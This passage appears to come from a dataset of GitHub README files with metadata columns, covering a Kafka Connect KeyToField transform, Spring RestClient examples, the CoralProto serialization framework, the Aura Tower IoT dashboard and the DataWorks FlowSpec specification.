To use the `KeyToField` transformation, add it to your Kafka Connect connector configuration:
```
transforms=keyToField
transforms.keyToField.type=com.github.eladleev.kafka.connect.transform.keytofield.KeyToFieldTransform
transforms.keyToField.field.name=primaryKey
transforms.keyToField.field.delimiter=_
```

### Example
Consider a Kafka topic with the following record:


```json
{
  ""key"": {
    ""id"": 123,
    ""timestamp"": 1644439200000
  },
  ""value"": {
    ""data"": ""example""
  }
}
```

After applying the `KeyToField` transformation, the record will be transformed as follows:

```json
{
  ""key"": {
    ""id"": 123,
    ""timestamp"": 1644439200000
  },
  ""value"": {
    ""data"": ""example"",
    ""primaryKey"": ""123_1644439200000""
  }
}
```
## Local Development
For your convenience, under `dev/` you can find a `docker-compose` file that contains all necessary components for local development and testing. Kafka Connect will automatically load the connector from the `target/` directory.   
Use the attached bash script to submit a new Kafka Connect connector. `Adminer` can be used to ingest new data to the database, reflected by an event in Kafka.

## Contributing
Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details of submitting a pull requests.

## License
This project is licensed under the Apache License - see the [LICENSE](LICENSE) file for details.
",2,1,4,3.0,"['keytofield', 'smt', 'kafka', 'connect', 'debezium', 'overview', 'feature', 'installation', 'configuration', 'usage', 'example', 'local', 'development', 'contribute', 'license']","['keytofield', 'smt', 'kafka', 'connect', 'debezium']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.jacoco:jacoco-maven-plugin]",0.0,1.0,0.0
danvega/rest-client-examples,main,"# Rest Client Examples

This is a collection of examples using the new `RestClient` in Spring Framework 6.1 & Spring Boot 3.2. 

These are the topics that I would like to cover in this series:

- `RestClient` Instance (org.springframework.web.client) âœ…
  - static factory methods
  - DefaultRestClientBuilder
- CRUD
    - List
    - Read
    - Persist
    - Query Params
- Testing with `@RestClientTest` âœ…
- HTTP Interfaces
- Switching Http Client Libraries âœ…
- Multipart Data
- Jackson JSON Views
- Error Handling
- Interceptors
- Retry (Interceptor)
- Proxy (SimpleClientHttpRequestFactory)
- Spring Cloud MVC
- Resilience
- Live Template âœ…

## RestClient Instance

[X Tutorial](https://twitter.com/therealdanvega/status/1750539660886004093)

## Client Request Factories

The `RestClient` uses an underlying Http Client to make calls over HTTP. If you want to read more about this you can check
out the [Spring Documentation](https://docs.spring.io/spring-framework/reference/integration/rest-clients.html#rest-request-factories). The 
following video is a walkthrough of how to do that. The code for this is located in `/src/main/resources/dev/danvega/rc/client/JdkClient.java`

[YouTube Tutorial](https://youtu.be/9M0NggD6Mbw)


## Testing with @RestClientTest

You can test your `RestClient` code using the `@RestClientTest` annotation. 

[YouTube Tutorial](https://youtu.be/jhhi03AIin4)

**Note**

If you run into an issue writing tests with `@RestClientTest` and you're using the JDK Http Client you might be running
into this https://github.com/spring-projects/spring-boot/issues/38832 


## Live Templates

[X Tutorial](https://twitter.com/therealdanvega/status/1750560170785054887)",0,1,1,0.0,"['rest', 'client', 'example', 'restclient', 'instance', 'client', 'request', 'factory', 'test', 'restclienttest', 'live', 'template']","['client', 'rest', 'example', 'restclient', 'instance']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
coralblocks/CoralProto,main,"# CoralProto
A fast, binary and garbage-free serialization framework with a simple schema definition language.

## Features
- Simple schema definition language with message type and subtype
- Fast parsing (or direct access without parsing)
- Strictly binary (big-endian)
- Ascii encoding for logging/debugging
- Garbage-free (no GC overhead)
- Primitive types (boolean, char, byte, short, int, long, float and double)
- Fixed byte and char arrays
- Variable byte and char arrays (VarChars and VarBytes)
- Enum fields (CharEnum, ShortEnum, IntEnum and TwoCharEnum)
- Fields can be made optional
- Repeating groups with nesting support (repeating groups inside repeating groups)
- Schema evolution by appending new (optional or non-optional) fields

## Schema Definition Language
```plain
    CLASSNAME = com.coralblocks.coralproto.example.PriceChangeMessage
    TYPE = P
    SUBTYPE = C
    
    symbolId: long
    symbolDesc: varchars(128)
    mqReqId: long!
    
    orders:
        side: boolean
        levelId: long!
        priceLevel: double
        qty: int
        legs:
          legId: int
          legDesc: chars(8)!
        orderId: long
    
    lastTradeQty: long!
    lastTradePrice: double!
```
- TYPE and SUBTYPE are mandatory
- An exclamation mark at the end of a field indicates that the field is optional
- Repeating groups are created through indentation
- The number between parenthesis for varchars (and varbytes) is the maximum allowed size/length
- The number between parenthesis for chars (and bytes) is the fixed size/length

**NOTE:** For convenience, you can place the schema specification inside the Java class so that when you execute its main method the class is updated with the generated source code of the message. You can see an example [here](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/example/PriceChangeMessage.java).

## Writting the Message Fields
```java
PriceChangeMessage proto = new PriceChangeMessage();

proto.symbolId.set(1111L);
proto.symbolDesc.set(""IBM"");
proto.mqReqId.markAsNotPresent();

    proto.orders.clear();

    proto.orders.nextElement();
    proto.orders.side.set(true);
    proto.orders.levelId.set(11111111L);
    proto.orders.priceLevel.set(200.15);
    proto.orders.qty.set(1000);

        proto.orders.legs.clear();
    
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(1);
        proto.orders.legs.legDesc.markAsNotPresent();
        
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(2);
        proto.orders.legs.legDesc.set(""myLeg2  "");

    proto.orders.orderId.set(1234L);

    proto.orders.nextElement();
    proto.orders.side.set(false);
    proto.orders.levelId.set(22222222L);
    proto.orders.priceLevel.set(200.75);
    proto.orders.qty.set(800);
    
        proto.orders.legs.clear();
    
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(1);
        proto.orders.legs.legDesc.set(""myLeg1  "");
        
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(2);
        proto.orders.legs.legDesc.markAsNotPresent();
    
    proto.orders.orderId.set(5678L);

proto.lastTradeQty.set(100);
proto.lastTradePrice.set(200.55);
```

## Reading the Message Fields
```java
Assert.assertEquals(PriceChangeMessage.TYPE, proto.getType());
Assert.assertEquals(PriceChangeMessage.SUBTYPE, proto.getSubtype());

Assert.assertEquals(1111L, proto.symbolId.get());
Assert.assertEquals(""IBM"", proto.symbolDesc.get().toString());
Assert.assertEquals(false, proto.mqReqId.isPresent());

Assert.assertEquals(2, proto.orders.getNumberOfElements());

proto.orders.beginIteration();

Assert.assertEquals(true, proto.orders.iterHasNext());
proto.orders.iterNext();

Assert.assertEquals(true, proto.orders.side.get());
Assert.assertEquals(11111111L, proto.orders.levelId.get());
Assert.assertTrue(200.15 == proto.orders.priceLevel.get());
Assert.assertEquals(1000, proto.orders.qty.get());

Assert.assertEquals(2, proto.orders.legs.getNumberOfElements());

proto.orders.legs.beginIteration();

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

Assert.assertEquals(1, proto.orders.legs.legId.get());
Assert.assertEquals(false, proto.orders.legs.legDesc.isPresent());

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

Assert.assertEquals(2, proto.orders.legs.legId.get());
Assert.assertEquals(""myLeg2  "", proto.orders.legs.legDesc.get().toString());

Assert.assertEquals(false, proto.orders.legs.iterHasNext());

Assert.assertEquals(true, proto.orders.iterHasNext());
proto.orders.iterNext();

Assert.assertEquals(false, proto.orders.side.get());
Assert.assertEquals(22222222L, proto.orders.levelId.get());
Assert.assertTrue(200.75 == proto.orders.priceLevel.get());
Assert.assertEquals(800, proto.orders.qty.get());

Assert.assertEquals(2, proto.orders.legs.getNumberOfElements());

proto.orders.legs.beginIteration();

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

Assert.assertEquals(1, proto.orders.legs.legId.get());
Assert.assertEquals(""myLeg1  "", proto.orders.legs.legDesc.get().toString());

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

Assert.assertEquals(2, proto.orders.legs.legId.get());
Assert.assertEquals(false, proto.orders.legs.legDesc.isPresent());

Assert.assertEquals(false, proto.orders.legs.iterHasNext());

Assert.assertEquals(false, proto.orders.iterHasNext());

Assert.assertEquals(100, proto.lastTradeQty.get());
Assert.assertTrue(200.55 == proto.lastTradePrice.get());
```
**NOTE:** The full automated test for the PriceChangeMessage can be seen [here](https://github.com/coralblocks/CoralProto/blob/main/src/test/java/com/coralblocks/coralproto/PriceChangeMessageTest.java).

## Writting to and Reading from a ByteBuffer
```java
PriceChangeMessage proto = new PriceChangeMessage();

proto.symbolId.set(1111L);

ByteBuffer bb = ByteBuffer.allocate(1024);
proto.write(bb);
bb.flip();

PriceChangeMessage received = new PriceChangeMessage();

received.read(bb);

Assert.assertTrue(received.equals(proto));
Assert.assertEquals(proto.orders.symbolId.get(), received.orders.symbolId.get());
```

## Using a ProtoParser
```java
public static class MyProtoParser extends ProtoParser {

    @Override
    protected Proto[] defineProtoMessages() {
        return new Proto[] {
                new ProtoMessage1(),
                new ProtoMessage2()
        };
    }
}

ProtoParser protoParser = new MyProtoParser();

Proto proto = protoParser.parse(byteBuffer);

if (proto == null) throw new RuntimeException(""Cannot parse ByteBuffer to Proto!"");

char type = proto.getType();
char subtype = proto.getSubtype();

if (type == ProtoMessage1.TYPE && subtype == ProtoMessage1.SUBTYPE) {
    ProtoMessage1 protoMessage1 = (ProtoMessage1) proto;
    // access the ProtoMessage1 fields and be happy...
} else if (type == ProtoMessage2.TYPE && subtype == ProtoMessage2.SUBTYPE) {
    ProtoMessage2 protoMessage2 = (ProtoMessage2) proto;
    // access the ProtoMessage2 fields and be happy...
} else {
    throw new RuntimeException(""Got a proto that I don't know how to handle: "" + proto);
}
```

## Using Enum Fields
You should provide enumerations that implement [CharEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/CharEnum.java), [ShortEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/ShortEnum.java), [IntEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/IntEnum.java) or [TwoCharEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/TwoCharEnum.java). Below an example:
```java
public static enum Side implements CharEnum { 

    BUY('B'), 
    SELL('S');

    private final char b;
    public final static CharMap<Side> ALL = new CharMap<Side>();
    
    static {
        for(Side s : Side.values()) {
            if (ALL.put(s.getChar(), s) != null) {
                throw new IllegalStateException(""Cannot have two sides with the same character: "" + s);
            }
        }
    }
    
    private Side(char b) {
        this.b = b;
    }
    
    @Override
    public final char getChar() {
        return b;
    }
}
```
And to define in your schema you simply do:
```plain
    side:     charEnum(Side) 
```
The corresponding char of the enum will be transmitted through the wire.

## Float and Double Fields
- Floats are transmitted through the wire as integers (4-byte big-endian). The default precision is 4 decimals.
- Doubles are transmitted through the wire as longs (8-byte big-endian). The default precision is 8 decimals.

If you need more or less decimal precision, you can pass the number of decimals when defining the field in the schema:
```plain
    myFloat1: float 
    myFloat2: float(3)
    myFloat3: float(5)
    myDouble1: double 
    myDouble2: double(7)
    myDouble3: double(9)	
```

## Evolving the Schema
You can evolve the schema without breaking compatibility by appending new fields to the end of your message. For example, you can evolve:
```plain
    CLASSNAME = com.coralblocks.coralproto.example.ProtoMessage1
    TYPE = P
    SUBTYPE = A
    
    symbolId: long
    symbolDesc: varchars(128)!
```
by appending a new field:
```plain
    CLASSNAME = com.coralblocks.coralproto.example.ProtoMessage1A
    TYPE = P
    SUBTYPE = A
    
    symbolId: long
    symbolDesc: varchars(128)!
    extraField: int
```
Then you can send an old version (without the field) to the new version:
```java
ByteBuffer bb = ByteBuffer.allocate(1024);

ProtoMessage1 p1 = new ProtoMessage1();

p1.symbolId.set(2L);
p1.symbolDesc.set(""IBM"");

p1.write(bb);

bb.flip();

Assert.assertEquals(ProtoMessage1A.TYPE, bb.get());
Assert.assertEquals(ProtoMessage1A.SUBTYPE, bb.get());

// schema has evolved, it now has an extra field...

ProtoMessage1A p1A = new ProtoMessage1A();

p1A.read(bb);

Assert.assertEquals(2L, p1A.symbolId.get());
Assert.assertEquals(""IBM"", p1A.symbolDesc.get().toString());
Assert.assertEquals(0, p1A.extraField.get()); // default value
```
And you can send a new version (with the field) to the old version:
```java
ByteBuffer bb = ByteBuffer.allocate(1024);

ProtoMessage1A p1A = new ProtoMessage1A();

p1A.symbolId.set(2L);
p1A.symbolDesc.set(""IBM"");
p1A.extraField.set(111);

p1A.write(bb);

bb.flip();

Assert.assertEquals(ProtoMessage1.TYPE, bb.get());
Assert.assertEquals(ProtoMessage1.SUBTYPE, bb.get());

ProtoMessage1 p1 = new ProtoMessage1();

p1.read(bb);

Assert.assertEquals(2L, p1.symbolId.get());
Assert.assertEquals(""IBM"", p1.symbolDesc.get().toString());
```
**NOTE:** We are changing the message name from `ProtoMessage1` to `ProtoMessage1A` just to be able to test inside the same class. When you evolve a message you will want to keep the same message name.

## Generating Source Code
To generate the Java source code of your messages from the schema definition files, you should do:
```plain
$ java com.coralblocks.coralproto.IDL <FOLDER_NAME> <DRY_RUN> <EXTENSION>
```
- The `FOLDER_NAME` argument is the folder where the test files containing the scheme definition of your messages are located. Each message should have its own file.
  
- The `DRY_RUN` argument is to test without replacing any source code. It defaults to false.
  
- The `EXTENSION` argument is the extension of the text files with the schema definition. It defaults to `.idl`.
  
The source code of the messages will be generated inside the same folder.

**NOTE:** When the source code is generated you will most probably need to use `ORGANIZE IMPORTS` (usually CTRL + O) of your IDE to add the correct import statements for the code to compile.

## Logging in Ascii
You can print/log your message in ascii. See below:
```java
bb.clear();
proto.writeAscii(true, bb); // short version (without the message name, just type and subtype)
bb.flip();

Assert.assertEquals(""AF|Y|33|S|1111|222222|3300"", ByteBufferUtils.parseString(bb));

bb.clear();
received.writeAscii(false, bb); // long version (with the message name, type and subtype)
bb.flip();

Assert.assertEquals(""AF (AllFieldsProtoMessage)|Y|33|S|1111|222222|3300"", ByteBufferUtils.parseString(bb));
```
",0,0,1,0.0,"['coralproto', 'feature', 'schema', 'definition', 'language', 'writting', 'message', 'field', 'read', 'message', 'field', 'writting', 'reading', 'bytebuffer', 'use', 'protoparser', 'use', 'enum', 'field', 'float', 'double', 'field', 'evolve', 'schema', 'generate', 'source', 'code', 'log', 'ascii']","['field', 'schema', 'writting', 'message', 'use']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin]",0.0,1.0,0.0
blumek/aura-tower,master,"[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE) </br>
![Nginx](https://img.shields.io/badge/Nginx-009639?style=for-the-badge&logo=nginx&logoColor=white)
![Node.js](https://img.shields.io/badge/Node%20js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white)
![npm](https://img.shields.io/badge/npm-CB3837?style=for-the-badge&logo=npm&logoColor=white)
![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)
![Angular](https://img.shields.io/badge/Angular-DD0031?style=for-the-badge&logo=angular&logoColor=white) </br>
![Docker](https://img.shields.io/badge/Docker-2CA5E0?style=for-the-badge&logo=docker&logoColor=white)
![Apache Maven](https://img.shields.io/badge/apache_maven-C71A36?style=for-the-badge&logo=apachemaven&logoColor=white)
![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)
![Spring Boot](https://img.shields.io/badge/Spring_Boot-F2F4F9?style=for-the-badge&logo=spring-boot)
![Swagger](https://img.shields.io/badge/Swagger-85EA2D?style=for-the-badge&logo=Swagger&logoColor=white)
![Junit5](https://img.shields.io/badge/Junit5-25A162?style=for-the-badge&logo=junit5&logoColor=white)



# ğŸ›« Aura Tower

![Aura Tower logo](frontend/src/assets/images/logo-full.png)

Aura Tower is an open-source project designed to control and monitor IoT devices through an intuitive dashboard. The
project is highly extensible, allowing users to enhance its functionality with custom device drivers. This README
provides an overview of the project, milestones, and guidelines on how to contribute.

## ğŸ“– Table of Contents

- [ğŸ“¢ Introduction](#-introduction)
- [âœ¨ Features](#-features)
- [ğŸ¯ Milestones](#-milestones)
- [ğŸ’¿ Installation](#-installation)
- [ğŸ˜ Usage](#-usage)
- [ğŸ› ï¸ Contributing](#-contributing)
- [ğŸ–ï¸ License](#-license)

## ğŸ“¢ Introduction

Aura Tower aims to simplify the management of IoT devices, providing a centralized platform for controlling and
monitoring various devices. The project is built with flexibility in mind, enabling developers to create custom drivers
and expand the system's capabilities.

<a href=""https://www.youtube.com/watch?v=vA4TfWpt0PY""><img src=""frontend/src/assets/images/youtube-thumbnail.png"" alt=""Aura Tower Trailer"" width=""282"" height=""195""></a>

## âœ¨ Features

- **Dashboard for IoT device management**
- **User authentication system**
- **Places management**
- **Device metrics presentation**
- **Custom device drivers development**

## ğŸ¯ Milestones

1. ~~**User Authentication**~~
    - ~~Register user~~
    - ~~Login~~
    - ~~Remind password~~
    - ~~Refresh token~~
    - ~~Authentication with access token~~
    - ~~Views implementation~~

2. ~~**Places Management**~~
    - ~~Create place~~
    - ~~Delete place~~
    - ~~Update place~~
    - ~~View implementation~~

3. ~~**Metrics Presentation**~~
    - ~~Querying~~
    - ~~WebSockets~~
    - ~~View implementation~~

4. ~~**Application Introduction**~~
    - ~~Views implementation~~

5. ~~**Application Settings**~~
    - ~~Account security settings~~
    - ~~Color scheme modes selection~~
    - ~~Development information~~

6. ~~**Device Simulators**~~
    - ~~Light bulb simulator over HTTP~~
    - ~~Thermometer simulator over HTTP~~

7. **Device Metrics View Creator**
    - Driver, device, type to use
    - Selection of data to display

8. **Areas Inside Places**
    - Grouping devices together for bulk management

9. **Application Optimizations and Technical Debt Pay down**
    - Performance improvements
    - Codebase refactoring

## ğŸ’¿ Installation

> [!NOTE]
> Docker is required.

1. Clone the repository:
    ```bash
    git clone https://github.com/blumek/aura-tower.git
    ```

2. Navigate to the project directory:
    ```bash
    cd aura-tower
    ```

3. Pull docker containers:
    ```bash
    docker compose pull
    ```

4. Build docker containers:
    ```bash
    docker compose build
    ```

5. Start docker containers:
    ```bash
    docker compose up -d
    ```

## ğŸ˜ Usage

After starting the development server, open your browser and navigate to `http://localhost:4201`. From the dashboard,
you can register a new account, log in, and start managing your IoT devices. Use the settings to customize your
experience and explore the various features offered by Aura Tower.

![Aura Tower screen](frontend/src/assets/images/aura-screenshot.png)

## ğŸ› ï¸ Contributing

Aura Tower is open to contributions from the community. To contribute:

1. Fork the repository on GitHub.
2. Create a new branch for your feature or bugfix.
3. Make your changes and commit them with descriptive messages.
4. Push your changes to your forked repository.
5. Open a pull request on the main repository.

Please ensure your code adheres to the project's coding standards and includes appropriate tests.

## ğŸ–ï¸ License

Aura Tower is open-source software licensed under the [MIT License](LICENSE). You are free to use, modify, and
distribute this software as long as you comply with the license terms.

---

Thank you for being a part of the Aura Tower community! Together, we can build a powerful and flexible platform for IoT
device management.
",0,0,1,0.0,"['aura', 'tower', 'table', 'content', 'introduction', 'feature', 'milestone', 'installation', 'usage', 'contribute', 'license']","['aura', 'tower', 'table', 'content', 'introduction']",16.0,"[com.github.spotbugs:spotbugs-maven-plugin,com.h3xstream.findsecbugs:findsecbugs-plugin,io.fabric8:docker-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,12.0,4.0
aliyun/dataworks-spec,master,"[![License](https://img.shields.io/badge/license-Apache%202-4EB1BA.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)
![version](https://img.shields.io/badge/version-1.2.0-blue)
[![Java CI with Maven](https://github.com/aliyun/dataworks-spec/actions/workflows/main.yml/badge.svg)](https://github.com/aliyun/dataworks-spec/actions/workflows/main.yml)
[![CN doc](https://img.shields.io/badge/æ–‡æ¡£-ä¸­æ–‡ç‰ˆ-blue.svg)](./README_zh_CN.md)

# Introduction

* In this project we defined a generic workflow description specification(FlowSpec)
* We developed a FlowSpec based migration tool(MigrationX) to migrate workflow models from different workflow scheduling systems to DataWorks workflow
  model.
* We can use this tool to develop conversion tools for other scheduling system workflow model.

# FlowSpec Field Reference

## CycleWorkflow

CycleWorkflow is the specification of a scheduled workflow that contains task nodes and dependencies

### Fields

| Field Name |                Field Type                 | Required | Description                            |
|:----------:|:-----------------------------------------:|----------|----------------------------------------|
| `version`  |                 `string`                  | Yes      | Version                                |
|   `kind`   |                 `string`                  | Yes      | CycleWorkflow                          |
| `metadata` |          [`Metadata`](#metadata)          | No       | define extra meta data of workflow     |
|   `spec`   | [`CycleWorkflowSpec`](#cycleworkflowspec) | Yes      | specific definition of `CycleWorkflow` |

## ManualWorkflow

ManualWorkflow is the specification of manual triggered workflow consist of task nodes and dependencies

### Fields

| Field Name |                 Field Type                  | Required | Description                             |
|:----------:|:-------------------------------------------:|----------|-----------------------------------------|
| `version`  |                  `string`                   | Yes      | version info                            |
|   `kind`   |                  `string`                   | Yes      | ManualWorkflow                          |
| `metadata` |           [`Metadata`](#metadata)           | No       | define extra meta data of workflow      |
|   `spec`   | [`ManualWorkflowSpec`](#manualworkflowspec) | Yes      | specific definition of `ManualWorkflow` |

## CycleWorkflowSpec

CycleWorkflowSpec the specification of `CycleWorkflow`

### Fields

|     Field Name     |                    Field Type                    | Required | Description                                      |
|:------------------:|:------------------------------------------------:|----------|--------------------------------------------------|
|      `nodes`       |            `Array<`[`Node`](#node)`>`            | Yes      | list of cycle node definition                    |
|    `variables`     |        `Array<`[`Variable`](#variable)`>`        | No       | list of variable definition                      |
|     `scripts`      |          `Array<`[`Script`](#script)`>`          | No       | list of script definition                        |
|     `triggers`     |         `Array<`[`Trigger`](#trigger)`>`         | No       | list of cycle trigger definition                 |
|    `artifacts`     |        `Array<`[`Artifact`](#Artifact)`>`        | No       | list of artifact definition                      |
| `runtimeResources` | `Array<`[`RuntimeResource`](#runtimeresource)`>` | No       | list of runtime resource definition              |
|  `fileResources`   |    `Array<`[`FileResource`](#fileResource)`>`    | No       | list of file resource definition                 |
|    `functions`     |        `Array<`[`Function`](#function)`>`        | No       | list of function definition                      |
|       `flow`       |            `Array<`[`Flow`](#flow)`>`            | No       | list of flow defines node dependent relationship |

## ManualWorkflowSpec

ManualWorkflowSpec is the specification of `ManualWorkflow`

### Fields

|     Field Name     |                    Field Type                    | Required | Description                                      |
|:------------------:|:------------------------------------------------:|----------|--------------------------------------------------|
|      `nodes`       |            `Array<`[`Node`](#node)`>`            | Yes      | list of manual node definition                   |
|    `variables`     |        `Array<`[`Variable`](#variable)`>`        | No       | list of variable definition                      |
|     `scripts`      |          `Array<`[`Script`](#script)`>`          | No       | list of script definition                        |
|    `artifacts`     |        `Array<`[`Artifact`](#Artifact)`>`        | No       | list of artifact definition                      |
| `runtimeResources` | `Array<`[`RuntimeResource`](#runtimeresource)`>` | No       | list of runtime resource definition              |
|  `fileResources`   |    `Array<`[`FileResource`](#fileResource)`>`    | No       | list of file resource definition                 |
|    `functions`     |        `Array<`[`Function`](#function)`>`        | No       | list of function definition                      |
|       `flow`       |            `Array<`[`Flow`](#flow)`>`            | No       | list of flow defines node dependent relationship |

## Metadata

Defines extra metadata of resource

### Fields

|  Field Name   | Field Type | Required | Description         |
|:-------------:|:----------:|----------|---------------------|
|    `owner`    |  `string`  | No       | owner of spec       |
| `description` |  `string`  | No       | description of spec |

## Node

Node is the definition of workflow node.

### Fields

|    Field Name     |                 Field Type                 | Required | Description                                                                                         |
|:-----------------:|:------------------------------------------:|----------|-----------------------------------------------------------------------------------------------------|
|       `id`        |                   String                   | Yes      | node local identifier in spec                                                                       |                     
|      `name`       |                   String                   | Yes      | node name                                                                                           |                     
|     `script`      |            [`Script`](#script)             | Yes      | referred script define or reference of the node                                                     |                     
|    `functions`    |     `Array<`[`Function`](#function)`>`     | No       | referred functions define or reference of the node                                                  |
|  `fileResources`  | `Array<`[`FileResource`](#fileResource)`>` | No       | referred file resources define or reference of the node                                             |                         
|     `inputs`      |            [`Inputs`](#inputs)             | No       | inputs of the node. `TableArtifact`, `NodeArtifcat`, `Variable` can be used as inputs of `Node`     |
|     `outputs`     |           [`Outputs`](#outputs)            | No       | outputs of the node. `TableArtifact`, `NodeArtifcat`, `Variable` can be used as outputs of `Node`   |
| `runtimeResource` |   [`RuntimeResource`](#runtimeResource)    | No       | runtime resource define or reference of the node                                                    |
|   `recurrence`    |                   string                   | No       | `recurrence` defines cycle schedule state of node, see enumerated values: [Recurrence](#recurrence) |
|    `priority`     |                  integer                   | No       | priority of the node, the larger the value, the higher the priority                                 |
|     `timeout`     |                  integer                   | No       | timeout in seconds of the node, node instance will be killed when timed out after specified seconds |
|  `instanceMode`   |                   string                   | No       | instance mode of the node, see enumerated values [InstanceMode](#instancemode)                      |
|    `rerunMode`    |                   string                   | No       | the rerun strategy of the node instance, see enumerated values [RerunMode](#rerunmode)              |

## Flow

The `flow` section of spec defines dependencies of related workflow nodes.

### Fields

| Field Name |               Field Type               | Required | Description                                      |
|:----------:|:--------------------------------------:|----------|--------------------------------------------------|
|  `nodeId`  |                `string`                | Yes      | node identifier of specific node defined in spec |
| `depends`  | `Array<`[`FlowDepend`](#flowDepend)`>` | Yes      | list of nodes depended by the node               |

## FlowDepend

`FlowDepend` define the dependency or relationship between workflow nodes.

| Field Name | Field Type | Required | Description                                                                          |
|:----------:|:----------:|----------|--------------------------------------------------------------------------------------|
|  `nodeId`  |  `string`  | Yes      | node identifier of specific node defined in spec                                     |
|   `type`   |  `string`  | Yes      | dependency type of the node, see enumerated values [DependencyType](#dependencyType) |

## Variable

`Variable` defines variables of workflow. Variables can be used in workflow nodes.

### Fields

| Field Name | Field Type | Required | Description                                                           |
|:----------:|:----------:|----------|-----------------------------------------------------------------------|
|    `id`    |  `string`  | Yes      | local identifier in spec                                              |
|   `name`   |  `string`  | Yes      | variable name                                                         |
|  `scope`   |  `string`  | Yes      | variable scope, see enumerated values [VariableScope](#variableScope) |
|   `type`   |  `string`  | Yes      | variable type, see enumerated values [VariableType](#variableType)    |
|  `value`   |  `string`  | Yes      | variable value expression                                             |

## Script

`Script` defines script source file resources. Scripts can be used in workflow by nodes, functions or resources.

### Fields

|  Field Name  |             Field Type             | Required | Description                                  |
|:------------:|:----------------------------------:|----------|----------------------------------------------|
|     `id`     |              `string`              | Yes      | local identifier in spec                     |
|    `path`    |              `string`              | Yes      | script path                                  |
|  `language`  |              `string`              | No       | script language                              |
|  `runtime`   |        [Runtime](#runtime)         | Yes      | runtime definition of script                 |
| `parameters` | `Array<`[`Variable`](#variable)`>` | No       | list of parameter definitions used by script |

## Trigger

`Trigger` defines the rules of firing time of scheduled nodes.

### Fields

| Field Name  | Field Type | Required | Description                                                                                                     |
|:-----------:|:----------:|----------|-----------------------------------------------------------------------------------------------------------------|
|    `id`     |  `string`  | Yes      | local identifier in spec                                                                                        |
|   `type`    |  `string`  | Yes      | trigger type, values: `Scheduler`, `Manual`                                                                     |
|   `cron`    |  `string`  | No       | cron expression of `Scheudler` Trigger                                                                          | 
| `startTime` |  `string`  | No       | start effect time of `Scheduler` Trigger. nodes will only instanced time in range from `startTime` to `endTime` | 
|  `endTime`  |  `string`  | No       | end of effect time of `Scheduler` Trigger.                                                                      |
| `timezone`  |  `string`  | No       | timezone of the `Scheduler` Trigger                                                                             |

## Artifact

Artifacts can be types like `NodeOutput`, `Table`, `Variable`. `Variable` can be a context variable produced by workflow nodes.

### Table

| Field Name | Field Type | Required | Description         |
|:----------:|:----------:|----------|---------------------|
|   `guid`   |  `string`  | Yes      | table artifact guid |

### NodeOutput

| Field Name | Field Type | Required | Description                      |
|:----------:|:----------:|----------|----------------------------------|
|  `output`  |  `string`  | Yes      | output string identifier of node |

## RuntimeResource

`RuntimeResource` defines runtime resources config are used to run workflow nodes runtime resources, like: resource group, YARN cluster etc.

### Fields

|   Field Name    | Field Type | Required | Description                      |
|:---------------:|:----------:|----------|----------------------------------|
|      `id`       |  `string`  | Yes      | local identifier in spec         |
| `resourceGroup` |  `string`  | Yes      | resource group global identifier |

## FileResource

`FileResource` defines the resource files used by workflow nodes. like jar, python, text file, archive files etc.

### Fields

| Field Name |    Field Type     | Required | Description                 |
|:----------:|:-----------------:|----------|-----------------------------|
|    `id`    |     `string`      | Yes      | local identifier in spec    |
|   `name`   |     `string`      | Yes      | resource file name          |
|  `script`  | [Script](#script) | Yes      | resource file script define |

## Function

User-Define-Function definition that used by workflow nodes.

### Fields

|   Field Name    |                 Field Type                 | Required | Description                    |
|:---------------:|:------------------------------------------:|----------|--------------------------------|
|      `id`       |                  `string`                  | Yes      | local identifier in spec       |
|     `name`      |                  `string`                  | Yes      | name of udf                    |
|    `script`     |             [Script](#script)              | Yes      | script file of udf             |
| `fileResources` | `Array<`[`FileResource`](#fileResource)`>` | No       | list of related file resources |

## Runtime

`Runtime` define the runtime environment of script. like command, runtime engine, image etc.

### Fields

| Field Name | Field Type | Required | Description                                                |
|:----------:|:----------:|----------|------------------------------------------------------------|
|  `engine`  |  `string`  | No       | runtime engine                                             |
| `command`  |  `string`  | No       | command identifier of script runtime execution environment |

## Outputs

Outputs hold parameters, artifacts, and results from a workflow node, `Outputs` can be consumed by another workflow node.

### Fields

|  Field Name   |               Field Type               | Required | Description                                                                           |
|:-------------:|:--------------------------------------:|----------|---------------------------------------------------------------------------------------|
|   `tables`    |      `Array<`[`Table`](#table)`>`      | No       | `tables` are list of artifact tables produced by node                                 |
|  `variables`  |   `Array<`[`Variable`](#variable)`>`   | No       | `variables` are list of `Variable` produced by node                                   |
